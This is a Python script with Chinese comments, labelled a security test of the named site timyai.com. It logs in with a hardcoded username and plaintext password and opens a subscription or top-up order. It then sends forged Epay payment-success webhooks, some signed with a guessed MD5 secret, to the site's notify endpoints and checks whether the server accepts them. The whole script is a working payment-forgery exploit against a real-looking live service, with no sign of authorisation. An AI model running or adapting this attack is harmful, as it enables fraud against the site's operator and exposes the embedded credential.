#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
timyai.com 安全测试 - HTTPS 版本 + 详细分析
"""

import requests
import json
import time
import random
import string
import hashlib
import urllib.parse

TARGET_URL_HTTPS = "https://timyai.com"
TARGET_URL_HTTP = "http://timyai.com"
USERNAME = "antplayer"
PASSWORD = "sjh@101709"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
})

def md5_sign(params, secret=""):
    """MD5 签名"""
    sorted_params = sorted([(k, v) for k, v in params.items() if k != 'sign'])
    sign_str = '&'.join([f"{k}={v}" for k, v in sorted_params])
    sign_str += secret
    return hashlib.md5(sign_str.encode('utf-8')).hexdigest()

def test_api_status():
    """测试 API 状态"""
    print("[+] 测试 API 状态...")
    
    for url in [f"{TARGET_URL_HTTPS}/api/status", f"{TARGET_URL_HTTP}/api/status"]:
        try:
            r = requests.get(url, timeout=10, verify=False)
            print(f"  {url}: {r.status_code} - {r.text[:100]}")
        except Exception as e:
            print(f"  {url}: 错误 - {e}")

def test_login():
    """测试登录"""
    print("\n[+] 测试登录...")
    
    # 尝试 HTTPS
    for url in [f"{TARGET_URL_HTTPS}/api/user/login", f"{TARGET_URL_HTTP}/api/user/login"]:
        print(f"\n  测试: {url}")
        
        data = {"username": USERNAME, "password": PASSWORD}
        
        # JSON 请求
        try:
            r = session.post(url, json=data, timeout=15, verify=False)
            print(f"    JSON: {r.status_code} - {r.text[:200]}")
            
            if r.status_code == 200:
                result = r.json()
                token = result.get('token') or (result.get('data', {}) if isinstance(result.get('data'), dict) else {}).get('token')
                if token:
                    return token
                    
        except Exception as e:
            print(f"    JSON 错误: {e}")
        
        # 表单请求
        try:
            r = session.post(url, data=data, timeout=15, verify=False)
            print(f"    Form: {r.status_code} - {r.text[:200]}")
        except Exception as e:
            print(f"    Form 错误: {e}")
    
    return None

def test_with_real_trade(token, trade_no, amount="100"):
    """使用真实订单号测试 webhook"""
    print(f"\n[+] 使用订单号测试 webhook: {trade_no}")
    
    headers = {}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    
    # Epay 参数
    params = {
        "trade_no": trade_no,
        "status": "success",
        "amount": amount,
        "param": "",
        "time": str(int(time.time())),
        "type": "alipay",
    }
    
    results = {}
    
    # 添加 MD5 签名
    params_with_sign = params.copy()
    params_with_sign['sign'] = md5_sign(params, "123456")
    
    endpoints = [
        "/api/user/epay/notify",
        "/api/subscription/epay/notify",
    ]
    
    for endpoint in endpoints:
        for method in ["GET", "POST"]:
            for use_sign in [False, True]:
                test_params = params_with_sign if use_sign else params
                
                try:
                    url = f"{TARGET_URL_HTTPS}{endpoint}"
                    
                    if method == "GET":
                        r = requests.get(url, params=test_params, headers=headers, timeout=15, verify=False)
                    else:
                        r = requests.post(url, data=test_params, headers=headers, timeout=15, verify=False)
                    
                    key = f"{method} {'签名' if use_sign else '无签名'} {endpoint}"
                    success = r.text.strip().lower() in ["success", "ok", "success()"]
                    
                    print(f"  {key}: {r.status_code} - {r.text[:50]} {'⚠️' if success else '✅'}")
                    
                    results[key] = {
                        "status": r.status_code,
                        "response": r.text,
                        "vulnerable": success
                    }
                    
                except Exception as e:
                    print(f"  {key}: 错误 - {e}")
    
    return results

def test_subscription_creation(token):
    """尝试创建订阅"""
    print("\n[+] 尝试创建订阅订单...")
    
    if not token:
        print("  需要登录 token")
        return None, None
    
    headers = {'Authorization': f'Bearer {token}'}
    
    # 获取订阅计划
    try:
        r = requests.get(f"{TARGET_URL_HTTPS}/api/subscription/plans", headers=headers, timeout=15, verify=False)
        print(f"  获取订阅计划: {r.status_code}")
        
        if r.status_code == 200:
            plans = r.json()
            print(f"  响应: {json.dumps(plans, ensure_ascii=False)[:300]}")
            
            # 尝试创建订阅
            if isinstance(plans, dict) and 'data' in plans:
                plans_list = plans['data']
                if plans_list:
                    plan_id = plans_list[0].get('id')
                    
                    # 创建订阅
                    data = {"plan_id": plan_id}
                    r2 = requests.post(f"{TARGET_URL_HTTPS}/api/subscription/epay/pay", json=data, headers=headers, timeout=15, verify=False)
                    print(f"  创建订阅: {r2.status_code}")
                    print(f"  响应: {r2.text[:300]}")
                    
                    # 提取订单号
                    if r2.status_code == 200:
                        result = r2.json()
                        trade_no = result.get('trade_no') or (result.get('data', {}) if isinstance(result.get('data'), dict) else {}).get('trade_no')
                        if trade_no:
                            return trade_no, plans_list[0].get('price')
    except Exception as e:
        print(f"  错误: {e}")
    
    return None, None

def main():
    print("="*60)
    print("timyai.com 安全测试报告")
    print("="*60)
    
    # 忽略 SSL 警告
    requests.packages.urllib3.disable_warnings()
    
    # 1. 测试 API 状态
    test_api_status()
    
    # 2. 测试登录
    token = test_login()
    
    # 3. 如果登录成功，尝试创建订单
    trade_no = None
    amount = None
    
    if token:
        print(f"\n[+] 登录成功，token: {token[:30]}...")
        
        # 尝试创建订阅订单
        trade_no, amount = test_subscription_creation(token)
        
        if not trade_no:
            # 尝试创建充值订单
            print("\n[+] 尝试创建充值订单...")
            headers = {'Authorization': f'Bearer {token}'}
            try:
                r = requests.post(
                    f"{TARGET_URL_HTTPS}/api/user/topup",
                    json={"amount": "100", "method": "alipay"},
                    headers=headers,
                    timeout=15,
                    verify=False
                )
                print(f"  创建充值: {r.status_code}")
                print(f"  响应: {r.text[:300]}")
                
                if r.status_code == 200:
                    result = r.json()
                    trade_no = result.get('trade_no')
                    amount = "100"
            except Exception as e:
                print(f"  错误: {e}")
    
    # 4. 测试 webhook
    if trade_no:
        print(f"\n[+] 找到订单号: {trade_no}")
        results = test_with_real_trade(token, trade_no, amount)
    else:
        # 使用模拟订单号测试
        print("\n[+] 使用模拟订单号测试...")
        fake_trade_no = f"SUBUSR123NO{''.join(random.choices(string.ascii_letters, k=6))}{int(time.time())}"
        results = test_with_real_trade(token, fake_trade_no, "100")
    
    # 总结
    print("\n" + "="*60)
    print("测试结果总结")
    print("="*60)
    
    vulnerable_found = False
    for test, result in results.items():
        if "error" not in result:
            if result.get("vulnerable"):
                print(f"⚠️  {test}: 可能存在漏洞 (响应: {result['response']})")
                vulnerable_found = True
            else:
                print(f"✅ {test}: 安全 (响应: {result['response'][:30]})")
        else:
            print(f"❌ {test}: {result['error']}")
    
    if not vulnerable_found:
        print("\n✅ 未发现明显的安全漏洞")
    
    return results

if __name__ == "__main__":
    main()